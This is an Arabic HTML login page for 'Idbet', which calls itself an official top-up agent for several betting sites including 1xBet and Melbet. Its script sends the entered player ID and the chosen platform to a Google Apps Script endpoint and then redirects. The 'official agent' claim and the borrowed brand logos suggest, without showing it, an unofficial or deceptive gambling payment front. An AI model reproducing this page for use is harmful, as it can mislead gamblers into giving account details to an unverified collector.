<!DOCTYPE html>  
<html lang="ar" dir="rtl">  
<head>  
  <meta charset="UTF-8" />  
  <meta name="viewport" content="width=device-width, initial-scale=1" />  
  <title>تسجيل الدخول</title>  
  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet" />  
  <style>
    :root { --header-height:70px; --idbet-color:#e50914; }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Tajawal', sans-serif;
      background: #f5f5f5;
      direction: rtl;
      color: #333;
    }
    header {
      height: var(--header-height);
      background: #fff;
      display: flex;
      align-items: center;
      padding: 0 24px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, .05);
      border-bottom: 1px solid #eee;
    }
    .header-brand {
      display: flex;
      align-items: center;
      gap: 12px;
      font-weight: 500;
    }
    .header-brand .idbet {
      color: var(--idbet-color);
      font-size: 1.2rem;
      font-weight: bold;
    }
    .header-brand .separator {
      color: #ccc;
    }
    .header-brand .slogan {
      color: #555;
      font-size: .95rem;
    }
    main {
      display: flex;
      justify-content: center;
      padding: 30px 16px;
    }
    .login-box {
      background: #fff;
      padding: 32px 24px;
      max-width: 420px;
      width: 100%;
      box-shadow: 0 4px 20px rgba(0, 0, 0, .1);
    }
    .title-wrapper {
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 1.35rem;
      font-weight: bold;
      margin-bottom: 20px;
    }
    .step-box {
      width: 36px;
      height: 36px;
      background: var(--idbet-color);
      color: #fff;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold;
    }
    .input-label {
      margin-bottom: 8px;
      font-weight: 600;
      display: flex;
      align-items: center;
      gap: 6px;
    }
    .input-group {
      margin-bottom: 16px;
      position: relative;
    }
    .input-group input {
      width: 100%;
      padding: 10px 40px 10px 10px;
      font-size: .95rem;
      border: 1px solid #ccc;
      border-radius: 8px;
      outline: none;
    }
    .info-icon {
      width: 22px;
      height: 22px;
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      cursor: help;
      transition: .3s;
      display: flex;
      align-items: center;
      justify-content: center;
      fill: #666;
    }
    .info-icon svg {
      display: block;
      width: 18px;
      height: 18px;
      fill: #666;
      transition: fill 0.3s ease;
    }
    .info-icon:hover svg {
      fill: var(--idbet-color);
    }
    .error-message {
      font-size: .85rem;
      margin-top: 6px;
      min-height: 22px;
      transition: color .3s ease;
      text-align: center;
    }
    .platform-icons {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 15px;
      justify-items: center;
      margin: 20px 0;
      align-items: center;
    }
    .icon {
      position: relative;
      width: 100px;
      height: 100px;
      border-radius: 14px;
      background: #fff;
      box-shadow: 0 2px 8px rgba(0, 0, 0, .05);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 12px;
      transition: .3s;
      border: 1px solid #eee;
      cursor: pointer;
    }
    .icon:hover {
      transform: translateY(-4px);
      box-shadow: 0 6px 14px rgba(0, 0, 0, .1);
    }
    .icon.selected {
      border-color: var(--idbet-color);
      box-shadow: 0 0 10px rgba(229, 9, 20, .3);
    }
    .icon.selected::after {
      content: "✓";
      position: absolute;
      top: 6px;
      left: 6px;
      width: 20px;
      height: 20px;
      background: var(--idbet-color);
      color: #fff;
      border-radius: 50%;
      font-size: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .icon img {
      height: 50px;
      max-width: 90%;
      object-fit: contain;
      display: block;
    }
    .icon-name {
      margin-top: 8px;
      font-weight: 600;
      font-size: .85rem;
      color: #333;
      text-align: center;
    }
    .login-btn {
      background: var(--idbet-color);
      color: #fff;
      font-weight: bold;
      border: none;
      padding: 10px 16px;
      width: 100%;
      border-radius: 8px;
      cursor: pointer;
      transition: .3s;
    }
    .login-btn:disabled {
      background: #ccc;
      cursor: not-allowed;
    }
    .login-btn:hover:not(:disabled) {
      background: #b20710;
    }
    .btn-spinner {
      width: 16px;
      height: 16px;
      border: 3px solid rgba(255, 255, 255, .6);
      border-top: 3px solid #fff;
      border-radius: 50%;
      display: inline-block;
      animation: spin .8s linear infinite;
      margin-right: 6px;
      vertical-align: middle;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    @media (max-width: 420px) {
      .platform-icons {
        grid-template-columns: repeat(3, 1fr);
        gap: 12px;
      }
      .icon {
        width: 90px;
        height: 90px;
        padding: 10px;
      }
      .icon img {
        height: 40px;
      }
      .icon-name {
        font-size: 0.8rem;
      }
    }
  </style>
</head>
<body>

<header>
  <div class="header-brand">
    <span class="idbet">Idbet</span><span class="separator">|</span><span class="slogan">وكيل الشحن الرسمي</span>
  </div>
</header>

<main>
  <section class="login-box">
    <div class="title-wrapper"><div class="step-box">1</div><h2>تسجيل الدخول</h2></div>

    <div class="input-group">
      <input id="player-id-1" type="text" placeholder="أدخل المعرّف" maxlength="10" />
      <span class="info-icon" title="رقم مكوَّن من 10 أرقام" aria-label="مساعدة">
        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="#666" viewBox="0 0 24 24" >
          <path d="M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2zm.25 17h-1.5v-1.5h1.5zm1.41-7.9a2.2 2.2 0 0 0-3.16-.44 1.5 1.5 0 0 0-.41 1.06h-1.5a3 3 0 0 1 .82-2.2 3.5 3.5 0 0 1 4.99.63 3.17 3.17 0 0 1 .3 3.56 3 3 0 0 1-2.27 1.46v1.5h-1.5v-1.5a1.5 1.5 0 0 0 1.15-2.67z"/>
        </svg>
      </span>
      <div class="error-message" id="error-message"></div>
    </div>

    <div class="platform-icons" id="platforms">
      <div class="icon" data-name="LineBet"><img src="https://i.postimg.cc/x1p0KbfL/cropped-linebet-logo.png" alt="LineBet" /><div class="icon-name">LineBet</div></div>
      <div class="icon" data-name="MegaPari"><img src="https://i.postimg.cc/3RRJsCtS/Wh7-Gu-Bom34-Xq4-Bu-QN5n-Qlj-XPXf-V6-CZothm-Lsl6a-S.webp" alt="MegaPari" /><div class="icon-name">MegaPari</div></div>
      <div class="icon" data-name="Melbet"><img src="https://i.postimg.cc/wjCr86FS/melbet.png" alt="Melbet" /><div class="icon-name">Melbet</div></div>
      <div class="icon" data-name="Gooobet"><img src="https://i.postimg.cc/NMyXmrWn/c943dc665c7e8926e8fb15cadd4e1eee.jpg" alt="Gooobet" /><div class="icon-name">Gooobet</div></div>
      <div class="icon" data-name="1xBet"><img src="https://i.postimg.cc/PrMCL4Cx/1-XBet-Casino-1200x900-1.png" alt="1xBet" /><div class="icon-name">1xBet</div></div>
    </div>

    <button class="login-btn" id="login-btn" disabled>تسجيل الدخول</button>
  </section>
</main>

<script>
  const input = document.getElementById('player-id-1');
  const errMsg = document.getElementById('error-message');
  const btn = document.getElementById('login-btn');
  const icons = document.querySelectorAll('.icon');
  let platform = null;

  const repReg = /^(\d)\1{9}$/;

  input.addEventListener('keydown', e => {
    const ok = ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab'];
    if (!ok.includes(e.key) && !/^\d$/.test(e.key)) e.preventDefault();
  });

  input.addEventListener('input', validate);

  icons.forEach(icon => {
    icon.addEventListener('click', () => {
      icons.forEach(i => i.classList.remove('selected'));
      icon.classList.add('selected');
      platform = icon.dataset.name;
      validate();
    });
  });

  function validate() {
    const val = input.value.replace(/\D/g, '');
    input.value = val;
    errMsg.textContent = '';
    btn.disabled = true;

    if (val.length !== 10) {
      errMsg.textContent = 'يجب أن يحتوي المعرّف على 10 أرقام.';
      return;
    }

    if (repReg.test(val)) {
      errMsg.textContent = 'المعرّف غير صالح (أرقام مكررة).';
      return;
    }

    if (!platform) {
      errMsg.textContent = 'يرجى اختيار المنصة.';
      return;
    }

    btn.disabled = false;
  }

  btn.addEventListener('click', async () => {
    btn.innerHTML = '<span class="btn-spinner"></span> جارٍ الإرسال...';
    btn.disabled = true;

    const payload = {
      userId: input.value,
      platform: platform
    };

    try {
      await fetch('https://script.google.com/macros/s/AKfycbzQXqfYK3rzSSR-ZKYDxsa1iqTQUpfflHnDZQVnU3hKxNoLG0j3gPO0KIijH5YZelQg3A/exec', {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      setTimeout(() => {
        localStorage.setItem('userId', input.value);
        window.location.href = 'home.html';
      }, 1200);
    } catch (err) {
      errMsg.textContent = 'حدث خطأ أثناء الإرسال، حاول مجددًا.';
      btn.innerHTML = 'تسجيل الدخول';
      btn.disabled = false;
    }
  });

  window.addEventListener('pageshow', () => {
    btn.disabled = true;
    btn.innerHTML = 'تسجيل الدخول';
    errMsg.textContent = '';
    input.value = '';
    platform = null;
    icons.forEach(i => i.classList.remove('selected'));
  });
</script>

</body>
</html>
